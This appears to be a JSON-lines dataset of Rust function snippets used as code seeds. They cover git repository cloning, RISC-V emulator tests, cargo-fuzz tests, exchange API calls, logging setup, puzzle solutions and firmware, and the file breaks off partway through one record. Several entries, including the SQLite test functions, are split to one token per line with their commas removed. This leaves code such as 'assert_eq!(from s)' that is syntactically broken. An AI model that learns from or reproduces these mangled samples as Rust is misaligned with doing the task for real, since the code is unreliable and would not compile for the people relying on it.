{"seed":"fn update_repo(url: &str) -> Result<PathBuf, Box<dyn std::error::Error>> {\n    let mut slug = url;\n    let prefix = \"https:\/\/github.com\/\";\n    if slug.starts_with(prefix) {\n        slug = &slug[prefix.len()..];\n    }\n    let prefix = \"git:\/\/github.com\/\";\n    if slug.starts_with(prefix) {\n        slug = &slug[prefix.len()..];\n    }\n    let prefix = \"https:\/\/git.chromium.org\/\";\n    if slug.starts_with(prefix) {\n        slug = &slug[prefix.len()..];\n    }\n    let suffix = \".git\";\n    if slug.ends_with(suffix) {\n        slug = &slug[..slug.len() - suffix.len()];\n    }\n\n    let path_s = format!(\"repos\/{}\", slug);\n    let path = PathBuf::from(&path_s);\n    if !UPDATED.lock().unwrap().insert(slug.to_string()) {\n        return Ok(path);\n    }\n    if path.exists() {\n        if should_update() {\n            \/\/ we know for sure the path_s does *not* contain .git as we strip it, so this is a safe\n            \/\/ temp directory\n            let tmp = format!(\"{}.git\", path_s);\n            std::fs::rename(&path, &tmp)?;\n            git(&[\n                \"clone\",\n                \"--bare\",\n                \"--dissociate\",\n                \"--reference\",\n                &tmp,\n                &url,\n                &path_s,\n            ])?;\n            std::fs::remove_dir_all(&tmp)?;\n        }\n    } else {\n        git(&[\"clone\", \"--bare\", &url, &path_s])?;\n    }\n    Ok(path)\n}","id":0}
{"seed":"pub fn test_andi() {\n    let buffer = fs::read(\"tests\/programs\/andi\").unwrap().into();\n    let result = run::<u32, SparseMemory<u32>>(&buffer, &vec![\"andi\".into()]);\n    assert!(result.is_ok());\n    assert_eq!(result.unwrap(), 0);\n}","id":1}
{"seed":"fn up_to_release(\n    repo: &Repository,\n    reviewers: &Reviewers,\n    mailmap: &Mailmap,\n    to: &VersionTag,\n) -> Result<AuthorMap, Box<dyn std::error::Error>> {\n    let to_commit = repo.find_commit(to.commit).map_err(|e| {\n        ErrorContext(\n            format!(\n                \"find_commit: repo={}, commit={}\",\n                repo.path().display(),\n                to.commit\n            ),\n            Box::new(e),\n        )\n    })?;\n    let modules = get_submodules(&repo, &to_commit)?;\n\n    let mut author_map = build_author_map(&repo, &reviewers, &mailmap, \"\", &to.raw_tag)\n        .map_err(|e| ErrorContext(format!(\"Up to {}\", to), e))?;\n\n    for module in &modules {\n        if let Ok(path) = update_repo(&module.repository) {\n            let subrepo = Repository::open(&path)?;\n            let submap = build_author_map(\n                &subrepo,\n                &reviewers,\n                &mailmap,\n                \"\",\n                &module.commit.to_string(),\n            )?;\n            author_map.extend(submap);\n        }\n    }\n\n    Ok(author_map)\n}","id":2}
{"seed":"async fn get_historic_rates() {\n    let exchange = init().await;\n    let req = GetHistoricRatesRequest {\n        market_pair: \"eth_btc\".to_string(),\n        interval: Interval::OneHour,\n        paginator: None,\n    };\n    let resp = exchange.get_historic_rates(&req).await.unwrap();\n    println!(\"{:?}\", resp);\n}","id":3}
{"seed":"fn help() {\n    cargo_fuzz().arg(\"help\").assert().success();\n}","id":4}
{"seed":"fn assert_memory_load_bytes_all<R: Rng>(\n    rng: &mut R,\n    max_memory: usize,\n    buf_size: usize,\n    addr: u64,\n) {\n    assert_memory_load_bytes(\n        rng,\n        &mut SparseMemory::<u64>::new_with_memory(max_memory),\n        buf_size,\n        addr,\n    );\n    assert_memory_load_bytes(\n        rng,\n        &mut FlatMemory::<u64>::new_with_memory(max_memory),\n        buf_size,\n        addr,\n    );\n    assert_memory_load_bytes(\n        rng,\n        &mut WXorXMemory::new(FlatMemory::<u64>::new_with_memory(max_memory)),\n        buf_size,\n        addr,\n    );\n\n    #[cfg(has_asm)]\n    assert_memory_load_bytes(\n        rng,\n        &mut AsmCoreMachine::new(ISA_IMC, VERSION0, 200_000),\n        buf_size,\n        addr,\n    );\n}","id":5}
{"seed":"async fn retrieve_pairs() {\n    let exchange = init().await;\n    let pairs = exchange.refresh_market_info().await.unwrap();\n    println!(\"{:?}\", pairs);\n}","id":6}
{"seed":"pub fn task_set_top_page_table(target: CAddr, table: CAddr) {\n    system_call(SystemCall::TaskSetTopPageTable {\n        request: (target, table),\n    });\n}","id":7}
{"seed":"async fn init() -> Result<Args> {\n\tlet mut log_on = false;\n\n\t#[cfg(feature = \"dev-console\")]\n\tmatch console_subscriber::try_init() {\n\t\tOk(_) => {\n\t\t\twarn!(\"dev-console enabled\");\n\t\t\tlog_on = true;\n\t\t}\n\t\tErr(e) => {\n\t\t\teprintln!(\"Failed to initialise tokio console, falling back to normal logging\\n{e}\")\n\t\t}\n\t}\n\n\tif !log_on && var(\"RUST_LOG\").is_ok() {\n\t\tmatch tracing_subscriber::fmt::try_init() {\n\t\t\tOk(_) => {\n\t\t\t\twarn!(RUST_LOG=%var(\"RUST_LOG\").unwrap(), \"logging configured from RUST_LOG\");\n\t\t\t\tlog_on = true;\n\t\t\t}\n\t\t\tErr(e) => eprintln!(\"Failed to initialise logging with RUST_LOG, falling back\\n{e}\"),\n\t\t}\n\t}\n\n\tlet args = args::get_args();\n\tlet verbosity = args.verbose.unwrap_or(0);\n\n\tif log_on {\n\t\twarn!(\"ignoring logging options from args\");\n\t} else if verbosity > 0 {\n\t\tlet log_file = if let Some(file) = &args.log_file {\n\t\t\tlet is_dir = metadata(&file).await.map_or(false, |info| info.is_dir());\n\t\t\tlet path = if is_dir {\n\t\t\t\tlet filename = format!(\n\t\t\t\t\t\"watchexec.{}.log\",\n\t\t\t\t\tchrono::Utc::now().format(\"%Y-%m-%dT%H-%M-%SZ\")\n\t\t\t\t);\n\t\t\t\tfile.join(filename)\n\t\t\t} else {\n\t\t\t\tfile.to_owned()\n\t\t\t};\n\n\t\t\t\/\/ TODO: use tracing-appender instead\n\t\t\tSome(File::create(path).into_diagnostic()?)\n\t\t} else {\n\t\t\tNone\n\t\t};\n\n\t\tlet mut builder = tracing_subscriber::fmt().with_env_filter(match verbosity {\n\t\t\t0 => unreachable!(\"checked by if earlier\"),\n\t\t\t1 => \"warn\",\n\t\t\t2 => \"info\",\n\t\t\t3 => \"debug\",\n\t\t\t_ => \"trace\",\n\t\t});\n\n\t\tif verbosity > 2 {\n\t\t\tuse tracing_subscriber::fmt::format::FmtSpan;\n\t\t\tbuilder = builder.with_span_events(FmtSpan::NEW | FmtSpan::CLOSE);\n\t\t}\n\n\t\tmatch if let Some(writer) = log_file {\n\t\t\tbuilder.json().with_writer(Mutex::new(writer)).try_init()\n\t\t} else if verbosity > 3 {\n\t\t\tbuilder.pretty().try_init()\n\t\t} else {\n\t\t\tbuilder.try_init()\n\t\t} {\n\t\t\tOk(_) => info!(\"logging initialised\"),\n\t\t\tErr(e) => eprintln!(\"Failed to initialise logging, continuing with none\\n{e}\"),\n\t\t}\n\t}\n\n\tOk(args)\n}","id":8}
{"seed":"fn main() -> Result<()> {\n    let inss = parse_instructions()?;\n\n    for (pc, ins) in inss.iter().enumerate() {\n        match ins.op {\n            Operation::Nothing => {\n                \/\/ Don't invert zero `nop`s as `jmp +0` results in a loop.\n                if ins.arg != 0 && print_fixed_acc(&inss, Operation::Jump, pc) {\n                    break;\n                }\n            }\n            Operation::Jump => {\n                \/\/ Finish as soon as one inversion fixes the code.\n                if print_fixed_acc(&inss, Operation::Nothing, pc) {\n                    break;\n                }\n            }\n            Operation::Accumulate => {}\n        }\n    }\n\n    Ok(())\n}","id":9}
{"seed":"fn build_all() {\n    let project = project(\"build_all\").with_fuzz().build();\n\n    \/\/ Create some targets.\n    project\n        .cargo_fuzz()\n        .arg(\"add\")\n        .arg(\"build_all_a\")\n        .assert()\n        .success();\n    project\n        .cargo_fuzz()\n        .arg(\"add\")\n        .arg(\"build_all_b\")\n        .assert()\n        .success();\n\n    \/\/ Build to ensure that the build directory is created and\n    \/\/ `fuzz_build_dir()` won't panic.\n    project.cargo_fuzz().arg(\"build\").assert().success();\n\n    let build_dir = project.fuzz_build_dir().join(\"release\");\n\n    let a_bin = build_dir.join(\"build_all_a\");\n    let b_bin = build_dir.join(\"build_all_b\");\n\n    \/\/ Remove the files we just built.\n    fs::remove_file(&a_bin).unwrap();\n    fs::remove_file(&b_bin).unwrap();\n\n    assert!(!a_bin.is_file());\n    assert!(!b_bin.is_file());\n\n    \/\/ Test that building all fuzz targets does in fact recreate the files.\n    project.cargo_fuzz().arg(\"build\").assert().success();\n\n    assert!(a_bin.is_file());\n    assert!(b_bin.is_file());\n}","id":10}
{"seed":"fn align_address(ptr: *const u8, align: usize) -> usize {\n    let addr = ptr as usize;\n    if addr % align != 0 {\n        align - addr % align\n    } else {\n        0\n    }\n}","id":11}
{"seed":"fn active_entity(entity: Entity, world: &World) -> bool {\n    return world.masks[entity] & VOXEL_PASS_MASK == VOXEL_PASS_MASK;\n}","id":12}
{"seed":"fn build_author_map_(\n    repo: &Repository,\n    reviewers: &Reviewers,\n    mailmap: &Mailmap,\n    from: &str,\n    to: &str,\n) -> Result<AuthorMap, Box<dyn std::error::Error>> {\n    let mut walker = repo.revwalk()?;\n\n    if repo.revparse_single(to).is_err() {\n        \/\/ If a commit is not found, try fetching it.\n        git(&[\n            \"--git-dir\",\n            repo.path().to_str().unwrap(),\n            \"fetch\",\n            \"origin\",\n            to,\n        ])?;\n    }\n\n    if from == \"\" {\n        let to = repo.revparse_single(to)?.peel_to_commit()?.id();\n        walker.push(to)?;\n    } else {\n        walker.push_range(&format!(\"{}..{}\", from, to))?;\n    }\n\n    let mut author_map = AuthorMap::new();\n    for oid in walker {\n        let oid = oid?;\n        let commit = repo.find_commit(oid)?;\n\n        let mut commit_authors = Vec::new();\n        if !is_rollup_commit(&commit) {\n            \/\/ We ignore the author of rollup-merge commits, and account for\n            \/\/ that author once by counting the reviewer of all bors merges. For\n            \/\/ rollups, we consider that this is the most relevant person, which\n            \/\/ is usually the case.\n            \/\/\n            \/\/ Otherwise, a single rollup with N PRs attributes N commits to the author of the\n            \/\/ rollup, which isn't fair.\n            commit_authors.push(Author::from_sig(commit.author()));\n        }\n        match parse_bors_reviewer(&reviewers, &repo, &commit) {\n            Ok(Some(reviewers)) => commit_authors.extend(reviewers),\n            Ok(None) => {}\n            Err(ErrorContext(msg, e)) => {\n                if e.is::<reviewers::UnknownReviewer>() {\n                    eprintln!(\"Unknown reviewer: {}\", ErrorContext(msg, e));\n                } else {\n                    return Err(ErrorContext(msg, e).into());\n                }\n            }\n        }\n        commit_authors.extend(commit_coauthors(&commit));\n        for author in commit_authors {\n            let author = mailmap.canonicalize(&author);\n            author_map.add(author, oid);\n        }\n    }\n    Ok(author_map)\n}","id":13}
{"seed":"fn get_versions(repo: &Repository) -> Result<Vec<VersionTag>, Box<dyn std::error::Error>> {\n    let tags = repo\n        .tag_names(None)?\n        .into_iter()\n        .filter_map(|v| v)\n        .map(|v| v.to_owned())\n        .collect::<Vec<_>>();\n    let mut versions = tags\n        .iter()\n        .filter_map(|tag| {\n            Version::parse(&tag)\n                .or_else(|_| Version::parse(&format!(\"{}.0\", tag)))\n                .ok()\n                .map(|v| VersionTag {\n                    name: format!(\"Rust {}\", v),\n                    version: v,\n                    raw_tag: tag.clone(),\n                    commit: repo\n                        .revparse_single(&tag)\n                        .unwrap()\n                        .peel_to_commit()\n                        .unwrap()\n                        .id(),\n                    in_progress: false,\n                })\n        })\n        .collect::<Vec<_>>();\n    versions.sort();\n    Ok(versions)\n}","id":14}
{"seed":"fn\nchecked_memory_handle\n(\n)\n-\n>\nResult\n<\nConnection\n>\n{\nlet\ndb\n=\nConnection\n:\n:\nopen_in_memory\n(\n)\n?\n;\ndb\n.\nexecute_batch\n(\n\"\nCREATE\nTABLE\nfoo\n(\nb\nBLOB\nt\nTEXT\ni\nINTEGER\nf\nFLOAT\nn\n)\n\"\n)\n?\n;\nOk\n(\ndb\n)\n}","id":15}
{"seed":"fn main() {\n\n    #[cfg(feature = \"breakout\")]\n    let memfile_bytes = include_bytes!(\"stm32h743zi_memory.x\");\n    #[cfg(not(feature = \"breakout\"))]\n    let memfile_bytes = include_bytes!(\"stm32h743vi_memory.x\");\n\n    \/\/ Put the linker script somewhere the linker can find it\n    let out = &PathBuf::from(env::var_os(\"OUT_DIR\").unwrap());\n    File::create(out.join(\"memory.x\"))\n        .unwrap()\n        .write_all(memfile_bytes)\n        .unwrap();\n    println!(\"cargo:rustc-link-search={}\", out.display());\n}","id":16}
{"seed":"fn process_instructions(instructions: &Vec<Instruction>) -> (HashMap<&str, i32>, i32) {\n    let mut registers: HashMap<&str, i32> = HashMap::new();\n    let mut max = 0;\n\n    for instruction in instructions {\n        let current = *registers.entry(&instruction.condition.register).or_insert(0);\n\n        let condition_satisfied = match instruction.condition.operator {\n            Operator::LessThan           => current <  instruction.condition.value,\n            Operator::LessThanOrEqual    => current <= instruction.condition.value,\n            Operator::GreaterThan        => current >  instruction.condition.value,\n            Operator::GreaterThanOrEqual => current >= instruction.condition.value,\n            Operator::Equal              => current == instruction.condition.value,\n            Operator::NotEqual           => current != instruction.condition.value,\n        };\n\n        if !condition_satisfied {\n            continue;\n        }\n\n        let delta = match instruction.increase {\n            true  => instruction.value,\n            false => -1 * instruction.value,\n        };\n\n        let entry = registers.entry(&instruction.register).or_insert(0);\n        *entry += delta;\n        let new_value = *entry;\n\n        if new_value > max {\n            max = new_value;\n        }\n    }\n\n    (registers, max)\n}","id":17}
{"seed":"fn broker(table: &mut Table, ntransfers: u32) {\n\n  let mut rng = thread_rng();\n  let mut ract = Range::new(0, 100);\n  let mut ramt = Range::new(0, 1000);\n  let mut nstale = 0;\n\n  for _ in 0..ntransfers {\n    let a1 = ract.sample(&mut rng);\n    let mut a2 = ract.sample(&mut rng);\n    while a2 == a1 {\n      a2 = ract.sample(&mut rng);\n    }\n    let n = ramt.sample(&mut rng);\n\n    let rt = table.time();\n    let mut vs = [Value::default(); 2];\n    table.read(rt, &[a1, a2], &mut vs);\n    let r1 = Row { k: a1, v: vs[0].v - n };\n    let r2 = Row { k: a2, v: vs[1].v + n };\n    match table.write(rt, &[r1, r2]) {\n      WriteResult::Stale { .. } => nstale += 1,\n      _ => ()\n    }\n  }\n  assert!(nstale < ntransfers \/ 2);\n}","id":18}
{"seed":"fn input(user_message: &str) -> io::Result<String> {\r\n    use std::io::Write;\r\n\r\n    print!(\"{}\", user_message);\r\n\r\n    io::stdout().flush()?;\r\n\r\n    let mut buffer: String = String::new();\r\n    io::stdin().read_line(&mut buffer)?;\r\n\r\n    Ok(buffer.trim_right().to_owned())\r\n}","id":19}
{"seed":"fn handle_task(client: &mut Client, main_out_c: Sender<String>) {\n    let (channel_out, channel_in) = unbounded();\n    let task_types = TaskCommandTypes::new();\n\n    \/\/ walk over the task queue. For any task_queue.state == 0, handle it.\n    for task in &mut client.task_queue {\n        \/\/ all tasks will have at least 1 iteration, but may have more. We also may have a sleep\n        \/\/ between iterations\n        let duration = (task.iteration_delay * 1000) as u64;\n        let sleep_duration = time::Duration::from_millis(duration);\n        for _iteration in 0..task.iterations {\n            let task_type = task_types.determine_task_type(task.command_type);\n            if task_type == \"filesystem\" {\n                \/\/ start the filesystem thread and go go go\n                let out_c = channel_out.clone();\n                filesystem::handle_filesystem(task, out_c);\n                task.state = 1;\n            }\n            \/\/ peek into the channel from our thread to see if there is data\n            \/\/ if there is, send it back\n            if let Ok(resp_from_thread) = channel_in.try_recv() {\n                println!(\"handle_task got something: {}\", &resp_from_thread);\n                \/\/ should send the task ID back out if successful. Otherwise, an err string\n                main_out_c.send(resp_from_thread).unwrap();\n                task.state = 2;\n            }\n            thread::sleep(sleep_duration);\n        }\n    }\n}","id":20}
{"seed":"fn main() {     \n        std::process::Command::new(\"packfolder.exe\").args(&[\"src\/frontend\", \"dupa.rc\", \"-binary\"])\n    .output().expect(\"no i ciul\");\n}","id":21}
{"seed":"fn array_test() {\n    let lazy_caterer: [u32; 6] = [1, 2, 4, 7, 11, 16];\n    let taxonomy = [\"Animalia\", \"arthropoda\", \"Insecta\"];\n\n    assert_eq!(lazy_caterer[3], 7);\n    assert_eq!(taxonomy.len(), 3);\n\n    let mut sieve = [true; 10000];\n    for i in 2..100 {\n        if sieve[i] {\n            let mut j = i * i;\n            while j < 10000 {\n                sieve[j] = false;\n                j += i;\n            }\n        }\n    }\n\n    assert!(sieve[211]);\n    assert!(!sieve[9876]);\n\n    let mut chaos = [3, 5, 4, 1, 2];\n    chaos.sort();\n    assert_eq!(chaos, [1, 2, 3, 4, 5]);\n}","id":22}
{"seed":"pub fn retype_task(source: CAddr, target: CAddr) {\n    system_call(SystemCall::RetypeTask {\n        request: (source, target),\n    });\n}","id":23}
{"seed":"fn char_test() {\n    assert_eq!('*'.is_alphabetic(), false);\n    assert_eq!('\u03b2'.is_alphabetic(), true);\n    assert_eq!('8'.to_digit(10), Some(8));\n    assert_eq!('\\u{CA0}'.len_utf8(), 3);\n    assert_eq!(std::char::from_digit(2, 10), Some('2'));\n}","id":24}
{"seed":"fn listing_a_single_migration_name_should_work(api: TestApi) {\n    let dm = api.datamodel_with_provider(\n        r#\"\n        model Cat {\n            id Int @id\n            name String\n        }\n    \"#,\n    );\n\n    let migrations_directory = api.create_migrations_directory();\n\n    api.create_migration(\"init\", &dm, &migrations_directory).send_sync();\n\n    api.apply_migrations(&migrations_directory)\n        .send_sync()\n        .assert_applied_migrations(&[\"init\"]);\n\n    api.list_migration_directories(&migrations_directory)\n        .send()\n        .assert_listed_directories(&[\"init\"]);\n}","id":25}
{"seed":"fn add() {\n    let project = project(\"add\").with_fuzz().build();\n    project\n        .cargo_fuzz()\n        .arg(\"add\")\n        .arg(\"new_fuzz_target\")\n        .assert()\n        .success();\n    assert!(project.fuzz_target_path(\"new_fuzz_target\").is_file());\n\n    assert!(project.fuzz_cargo_toml().is_file());\n    let cargo_toml = fs::read_to_string(project.fuzz_cargo_toml()).unwrap();\n    let expected_bin_attrs = \"test = false\\ndoc = false\";\n    assert!(cargo_toml.contains(expected_bin_attrs));\n\n    project\n        .cargo_fuzz()\n        .arg(\"run\")\n        .arg(\"new_fuzz_target\")\n        .arg(\"--\")\n        .arg(\"-runs=1\")\n        .assert()\n        .success();\n}","id":26}
{"seed":"fn db_scheme_type_mapper(scheme: &str) -> SchemeType {\n    match scheme {\n        \"postgres\" => SchemeType::Relative(5432),\n        \"mysql\" => SchemeType::Relative(3306),\n        _ => SchemeType::NonRelative,\n    }\n}","id":27}
{"seed":"fn main() -> ! {\n    let mut robot = init_peripherals(\n        stm32f446::Peripherals::take().unwrap(),\n        cortex_m::Peripherals::take().unwrap(),\n    );\n\n    init_servo(&mut robot);\n\n    let mut reader = TrameReader::new();\n\n    loop {\n        let b = block!(robot.pc_rx.read()).unwrap();\n        reader.step(b);\n        if let Some(trame) = reader.pop_trame() {\n            asm::bkpt();\n        }\n\n        \/*\n        let mess = servos[0x05].stat();\n        for b in mess {\n            block!(robot.servo_tx.write(b)).unwrap();\n        }\n\n        robot.delay.delay_ms(70 as u16);\n*\/\n        \/*\n        if let Ok(byte) = pc_rx.read() {\n            reader.step(byte);\n        }\n        if let Some(trame) = reader.pop_trame() {\n            if let Some(sent) = handle_trame(trame) {\n                let (arr, size): ([u8; 15], usize) = sent.into();\n                for b in arr[0..size].iter() {\n                    block!(pc_tx.write(*b)).unwrap();\n                }\n            }\n        }*\/\n    }\n}","id":28}
{"seed":"fn init() {\n    let project = project(\"init\").build();\n    project.cargo_fuzz().arg(\"init\").assert().success();\n    assert!(project.fuzz_dir().is_dir());\n    assert!(project.fuzz_cargo_toml().is_file());\n    assert!(project.fuzz_targets_dir().is_dir());\n    assert!(project.fuzz_target_path(\"fuzz_target_1\").is_file());\n    project\n        .cargo_fuzz()\n        .arg(\"run\")\n        .arg(\"fuzz_target_1\")\n        .arg(\"--\")\n        .arg(\"-runs=1\")\n        .assert()\n        .success();\n}","id":29}
{"seed":"async fn server(url: &str) -> Result<!, String> {\n\n    let server = TcpServer::bind(url).await.map_err(|e| e.to_string())?;\n    let (op_reads, op_writes) = TcpServerOp::<RequestLatRepr>::new(server.clone())\n        \/\/ .debug(\"ingress\")\n        .morphism_closure(|item| item.flatten_keyed::<tag::VEC>())\n        .morphism(Switch)\n        \/\/ .debug(\"split\")\n        .switch();\n\n    type ReadsLatRepr = MapUnionRepr<tag::HASH_MAP, String, SetUnionRepr<tag::HASH_SET, SocketAddr>>;\n    let op_reads = op_reads\n        \/\/ .debug(\"read\")\n        .lattice_default::<ReadsLatRepr>();\n\n    type WritesLatRepr = MapUnionRepr<tag::HASH_MAP, String, ValueLatRepr>;\n    let op_writes = op_writes\n        \/\/ .debug(\"write\")\n        .lattice_default::<WritesLatRepr>();\n\n    let binary_func = HashPartitioned::<String, _>::new(\n        TableProduct::<_, _, _, MapUnionRepr<tag::VEC, _, _>>::new());\n\n    let comp = BinaryOp::new(op_reads, op_writes, binary_func)\n        .morphism_closure(|item| item.transpose::<tag::VEC, tag::VEC>())\n        .comp_tcp_server::<ResponseLatRepr, _>(server);\n\n    comp\n        .run()\n        .await\n        .map_err(|e| format!(\"TcpComp error: {:?}\", e))?;\n}","id":30}
{"seed":"pub fn test_op_rvc_slli_crash_32() {\n    let buffer = fs::read(\"tests\/programs\/op_rvc_slli_crash_32\")\n        .unwrap()\n        .into();\n    let result = run::<u32, SparseMemory<u32>>(&buffer, &vec![\"op_rvc_slli_crash_32\".into()]);\n    assert!(result.is_ok());\n}","id":31}
{"seed":"pub fn get_home() -> Result<String, ()> {\n    match dirs::home_dir() {\n        None => Ok(String::new()),\n        Some(path) => Ok(path.to_str().unwrap().to_string()),\n    }\n}","id":32}
{"seed":"pub fn debug_test_fail() {\n    system_call(SystemCall::DebugTestFail);\n    loop {}\n}","id":33}
{"seed":"fn main() {\n    let re_top = Regex::new(r\" {4}|\\[([A-Z])\\]\").unwrap();\n    let re_action = Regex::new(r\"move (\\d+) from (\\d+) to (\\d+)\").unwrap();\n    let mut stacks: Vec<Vec<char>> = Vec::new();\n\n    let mut input = io::stdin().lock().lines()\n        .flat_map(|l| l.ok());\n\n    for line in &mut input {\n        if line.trim().is_empty() { break }\n        for (ix, ch) in match_iter::<char>(&re_top, &line).enumerate() {\n            if let Some(ch) = ch {\n                ensure_size(&mut stacks, ix + 1);\n                stacks[ix].push(ch);\n            }\n        }\n    }\n\n    for stack in &mut stacks {\n        stack.reverse()\n    }\n\n    for line in input {\n        if let Some((num, src, dst)) = match_capture::<Action>(&re_action, &line) {\n            let (src, dst) = get_disjoint(&mut stacks, src - 1, dst - 1);\n            assert!(num <= src.len(), \"Trying to pop {} from {}\", num, src.len());\n            let pos = src.len() - num;\n            dst.extend_from_slice(&src[pos..]);\n            src.truncate(pos);\n        }\n    }\n\n    let letters = stacks.iter().map(|s| s.last().expect(\"Stack is empty\"));\n    println!(\"{}\", letters.collect::<String>());\n}","id":34}
{"seed":"fn\ntest_string\n(\n)\n-\n>\nResult\n<\n(\n)\n>\n{\nlet\ndb\n=\nchecked_memory_handle\n(\n)\n?\n;\nlet\ns\n=\n\"\nhello\nworld\n!\n\"\n;\ndb\n.\nexecute\n(\n\"\nINSERT\nINTO\nfoo\n(\nt\n)\nVALUES\n(\n?\n1\n)\n\"\n[\ns\n.\nto_owned\n(\n)\n]\n)\n?\n;\nlet\nfrom\n:\nString\n=\ndb\n.\none_column\n(\n\"\nSELECT\nt\nFROM\nfoo\n\"\n)\n?\n;\nassert_eq\n!\n(\nfrom\ns\n)\n;\nOk\n(\n(\n)\n)\n}","id":35}
{"seed":"pub fn task_set_instruction_pointer(target: CAddr, ptr: u64) {\n    system_call(SystemCall::TaskSetInstructionPointer {\n        request: (target, ptr),\n    });\n}","id":36}
{"seed":"fn\ntest_mismatched_types\n(\n)\n-\n>\nResult\n<\n(\n)\n>\n{\nfn\nis_invalid_column_type\n(\nerr\n:\nError\n)\n-\n>\nbool\n{\nmatches\n!\n(\nerr\nError\n:\n:\nInvalidColumnType\n(\n.\n.\n)\n)\n}\nlet\ndb\n=\nchecked_memory_handle\n(\n)\n?\n;\ndb\n.\nexecute\n(\n\"\nINSERT\nINTO\nfoo\n(\nb\nt\ni\nf\n)\nVALUES\n(\nX\n'\n0102\n'\n'\ntext\n'\n1\n1\n.\n5\n)\n\"\n[\n]\n)\n?\n;\nlet\nmut\nstmt\n=\ndb\n.\nprepare\n(\n\"\nSELECT\nb\nt\ni\nf\nn\nFROM\nfoo\n\"\n)\n?\n;\nlet\nmut\nrows\n=\nstmt\n.\nquery\n(\n[\n]\n)\n?\n;\nlet\nrow\n=\nrows\n.\nnext\n(\n)\n?\n.\nunwrap\n(\n)\n;\nassert_eq\n!\n(\nvec\n!\n[\n1\n2\n]\nrow\n.\nget\n:\n:\n<\n_\nVec\n<\nu8\n>\n>\n(\n0\n)\n?\n)\n;\nassert_eq\n!\n(\n\"\ntext\n\"\nrow\n.\nget\n:\n:\n<\n_\nString\n>\n(\n1\n)\n?\n)\n;\nassert_eq\n!\n(\n1\nrow\n.\nget\n:\n:\n<\n_\nc_int\n>\n(\n2\n)\n?\n)\n;\nassert\n!\n(\n(\n1\n.\n5\n-\nrow\n.\nget\n:\n:\n<\n_\nc_double\n>\n(\n3\n)\n?\n)\n.\nabs\n(\n)\n<\nf64\n:\n:\nEPSILON\n)\n;\nassert_eq\n!\n(\nrow\n.\nget\n:\n:\n<\n_\nOption\n<\nc_int\n>\n>\n(\n4\n)\n?\nNone\n)\n;\nassert_eq\n!\n(\nrow\n.\nget\n:\n:\n<\n_\nOption\n<\nc_double\n>\n>\n(\n4\n)\n?\nNone\n)\n;\nassert_eq\n!\n(\nrow\n.\nget\n:\n:\n<\n_\nOption\n<\nString\n>\n>\n(\n4\n)\n?\nNone\n)\n;\nassert\n!\n(\nis_invalid_column_type\n(\nrow\n.\nget\n:\n:\n<\n_\nc_int\n>\n(\n0\n)\n.\nunwrap_err\n(\n)\n)\n)\n;\nassert\n!\n(\nis_invalid_column_type\n(\nrow\n.\nget\n:\n:\n<\n_\nc_int\n>\n(\n0\n)\n.\nunwrap_err\n(\n)\n)\n)\n;\nassert\n!\n(\nis_invalid_column_type\n(\nrow\n.\nget\n:\n:\n<\n_\ni64\n>\n(\n0\n)\n.\nerr\n(\n)\n.\nunwrap\n(\n)\n)\n)\n;\nassert\n!\n(\nis_invalid_column_type\n(\nrow\n.\nget\n:\n:\n<\n_\nc_double\n>\n(\n0\n)\n.\nunwrap_err\n(\n)\n)\n)\n;\nassert\n!\n(\nis_invalid_column_type\n(\nrow\n.\nget\n:\n:\n<\n_\nString\n>\n(\n0\n)\n.\nunwrap_err\n(\n)\n)\n)\n;\n#\n[\ncfg\n(\nfeature\n=\n\"\ntime\n\"\n)\n]\nassert\n!\n(\nis_invalid_column_type\n(\nrow\n.\nget\n:\n:\n<\n_\ntime\n:\n:\nOffsetDateTime\n>\n(\n0\n)\n.\nunwrap_err\n(\n)\n)\n)\n;\nassert\n!\n(\nis_invalid_column_type\n(\nrow\n.\nget\n:\n:\n<\n_\nOption\n<\nc_int\n>\n>\n(\n0\n)\n.\nunwrap_err\n(\n)\n)\n)\n;\nassert\n!\n(\nis_invalid_column_type\n(\nrow\n.\nget\n:\n:\n<\n_\nc_int\n>\n(\n1\n)\n.\nunwrap_err\n(\n)\n)\n)\n;\nassert\n!\n(\nis_invalid_column_type\n(\nrow\n.\nget\n:\n:\n<\n_\ni64\n>\n(\n1\n)\n.\nerr\n(\n)\n.\nunwrap\n(\n)\n)\n)\n;\nassert\n!\n(\nis_invalid_column_type\n(\nrow\n.\nget\n:\n:\n<\n_\nc_double\n>\n(\n1\n)\n.\nunwrap_err\n(\n)\n)\n)\n;\nassert\n!\n(\nis_invalid_column_type\n(\nrow\n.\nget\n:\n:\n<\n_\nVec\n<\nu8\n>\n>\n(\n1\n)\n.\nunwrap_err\n(\n)\n)\n)\n;\nassert\n!\n(\nis_invalid_column_type\n(\nrow\n.\nget\n:\n:\n<\n_\nOption\n<\nc_int\n>\n>\n(\n1\n)\n.\nunwrap_err\n(\n)\n)\n)\n;\nassert\n!\n(\nis_invalid_column_type\n(\nrow\n.\nget\n:\n:\n<\n_\nString\n>\n(\n2\n)\n.\nunwrap_err\n(\n)\n)\n)\n;\nassert\n!\n(\nis_invalid_column_type\n(\nrow\n.\nget\n:\n:\n<\n_\nVec\n<\nu8\n>\n>\n(\n2\n)\n.\nunwrap_err\n(\n)\n)\n)\n;\nassert\n!\n(\nis_invalid_column_type\n(\nrow\n.\nget\n:\n:\n<\n_\nOption\n<\nString\n>\n>\n(\n2\n)\n.\nunwrap_err\n(\n)\n)\n)\n;\nassert\n!\n(\nis_invalid_column_type\n(\nrow\n.\nget\n:\n:\n<\n_\nc_int\n>\n(\n3\n)\n.\nunwrap_err\n(\n)\n)\n)\n;\nassert\n!\n(\nis_invalid_column_type\n(\nrow\n.\nget\n:\n:\n<\n_\ni64\n>\n(\n3\n)\n.\nerr\n(\n)\n.\nunwrap\n(\n)\n)\n)\n;\nassert\n!\n(\nis_invalid_column_type\n(\nrow\n.\nget\n:\n:\n<\n_\nString\n>\n(\n3\n)\n.\nunwrap_err\n(\n)\n)\n)\n;\nassert\n!\n(\nis_invalid_column_type\n(\nrow\n.\nget\n:\n:\n<\n_\nVec\n<\nu8\n>\n>\n(\n3\n)\n.\nunwrap_err\n(\n)\n)\n)\n;\nassert\n!\n(\nis_invalid_column_type\n(\nrow\n.\nget\n:\n:\n<\n_\nOption\n<\nc_int\n>\n>\n(\n3\n)\n.\nunwrap_err\n(\n)\n)\n)\n;\nassert\n!\n(\nis_invalid_column_type\n(\nrow\n.\nget\n:\n:\n<\n_\nc_int\n>\n(\n4\n)\n.\nunwrap_err\n(\n)\n)\n)\n;\nassert\n!\n(\nis_invalid_column_type\n(\nrow\n.\nget\n:\n:\n<\n_\ni64\n>\n(\n4\n)\n.\nerr\n(\n)\n.\nunwrap\n(\n)\n)\n)\n;\nassert\n!\n(